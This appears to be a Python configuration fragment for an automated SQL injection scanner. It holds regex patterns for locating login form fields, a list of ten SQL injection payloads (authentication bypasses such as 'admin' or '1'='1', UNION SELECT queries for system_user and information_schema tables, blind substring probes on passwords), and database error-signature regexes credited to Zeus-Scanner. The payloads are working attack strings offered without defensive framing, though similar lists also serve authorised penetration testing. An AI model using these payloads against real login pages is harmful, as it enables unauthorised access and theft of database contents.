logninputs = ['type="password"', 
            'placeholder="[Pp]assword"',
            'id="password"',
            'name="[Uu]sername"',
            'id="username"', 
            'name="[Ee]mail"',
            'type="email"',
            'id="login-button"',
            '[Ll]ogin',
            '[Ll]og [Ii]n']



payloads = ["' or ''-'", 
            "admin' or '1'='1", 
            "' UNION ALL SELECT 1", 
            "AND 1=1 AND '%'='", 
            "' UNION ALL SELECT system_user(),user();#", 
            "' UNION select table_schema,table_name FROM information_Schema.tables;#", 
            "admin' and substring(password/text(),1,1)='7", 
            "' and substring(password/text(),1,1)='7", 
            "' or 1=1 limit 1 -- -+", 
            "'=or'"]


# Regex from Ekultek (https://github.com/Ekultek/Zeus-Scanner/blob/master/lib/core/settings.py) with some edits
Errors = {
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\.", r"MySQL Query fail.*", r"SQL syntax.*MariaDB server.*",r"SQL ERROR.*"),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\.", r"Warning.*PostgreSQL"),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
                            r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*",
                            r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}",
                            r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\.",
                            r"Msg \d+, Level \d+, State \d+", r"Unclosed quotation mark after the character string",
                            r"Microsoft OLE DB Provider for ODBC Drivers"),
    "Microsoft Access": (r"Microsoft Access Driver", r"Microsoft JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Microsoft OLE DB Provider for Oracle",
            r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception",
            r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*",
            r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*")
}

